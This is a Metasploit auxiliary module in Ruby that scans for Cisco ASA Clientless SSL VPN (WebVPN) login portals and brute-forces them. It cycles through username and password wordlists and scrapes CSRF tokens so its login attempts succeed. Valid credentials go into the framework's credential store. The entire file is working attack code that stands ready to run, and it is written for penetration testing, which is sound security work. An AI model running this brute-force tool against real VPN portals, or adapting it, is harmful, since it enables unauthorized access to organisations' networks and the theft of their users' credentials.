##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Deprecated
  moved_from 'auxiliary/scanner/http/cisco_asa_asdm'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco ASA Clientless SSL VPN (WebVPN) Brute-force Login Utility',
        'Description' => %q{
          This module scans for Cisco ASA Clientless SSL VPN (WebVPN) web login portals and
          performs login brute-force to identify valid credentials.
        },
        'Author' => [
          'Jonathan Claudius <jclaudius[at]trustwave.com>', # original Metasploit module
          'jbaines-r7' # updated module
        ],
        'References' => [
          [ 'URL', 'https://www.cisco.com/c/en/us/support/docs/security-vpn/webvpn-ssl-vpn/119417-config-asa-00.html' ]
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('GROUP', [true, 'The connection profile to log in to (blank by default)', '']),
        OptPath.new('USERPASS_FILE', [
          false, 'File containing users and passwords separated by space, one pair per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')
        ]),
        OptPath.new('USER_FILE', [
          false, 'File containing users, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_users.txt')
        ]),
        OptPath.new('PASS_FILE', [
          false, 'File containing passwords, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')
        ])
      ]
    )
  end

  def run_host(_ip)
    # Establish the remote host is running the clientless vpn
    res = send_request_cgi('uri' => normalize_uri('/+CSCOE+/logon.html'))
    if res && res.code == 200 && res.get_cookies.include?('webvpn')
      print_status('The remote target appears to host Cisco SSL VPN Service. The module will continue.')
      print_status('Starting login brute force...')

      each_user_pass do |user, pass|
        do_login(user, pass)
      end
    else
      print_status('Cisco SSL VPN Service not detected on the remote target')
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'Cisco ASA SSL VPN Service',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Brute-force the login page
  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")

    # some versions require we snag a CSRF token. So visit the logon portal
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('/+CSCOE+/logon.html'))
    return unless res && res.code == 200

    vars_hash = {
      'tgroup' => '',
      'next' => '',
      'tgcookieset' => '',
      'username' => user,
      'password' => pass,
      'Login' => 'Login'
    }

    cookie = 'webvpnlogin=1'

    # the web portal may or may not contain CSRF tokens. So snag the token if it exists.
    if res.body.include?('csrf_token')
      csrf_token = res.body[/<input name="csrf_token" type=hidden value="(?<token>[0-9a-f]+)">/, :token]
      if csrf_token
        vars_hash['csrf_token'] = csrf_token
        cookie = "#{cookie}; CSRFtoken=#{csrf_token};"
      else
        print_error('Failed to grab the CSRF token')
        return
      end
    end

    # only add the group if the user specifies a non-empty value
    unless datastore['GROUP'].nil? || datastore['GROUP'].empty?
      vars_hash['group_list'] = datastore['GROUP']
    end

    res = send_request_cgi({
      'uri' => normalize_uri('/+webvpn+/index.html'),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'cookie' => cookie,
      'vars_post' => vars_hash
    })

    # check if the user was likely forwarded to the clientless vpn page
    if res && res.code == 200 && res.body.include?('/+webvpn+/webvpn_logout.html') && res.body.include?('/+CSCOE+/session.js')

      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)

      # logout - the default vpn connection limit is 2 so it's best to free this one up. Unfortunately,
      # we need a CSRF and non-CSRF version for this as well.
      if res.body.include?('csrf_token')
        csrf_token = res.body[/<input type="hidden" name="csrf_token" value="(?<token>[0-9a-f]+)">/, :token]

        # if we don't pull out the token... just keep going? Failing logout isn't the end of the world.
        if csrf_token
          send_request_cgi(
            'uri' => normalize_uri('/+webvpn+/webvpn_logout.html'),
            'method' => 'POST',
            'vars_post' => { 'csrf_token' => csrf_token },
            'cookie' => res.get_cookies
          )
        end
      else
        send_request_cgi('uri' => normalize_uri('/+webvpn+/webvpn_logout.html'), 'cookie' => res.get_cookies)
      end

      return :next_user
    else
      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end
  end
end
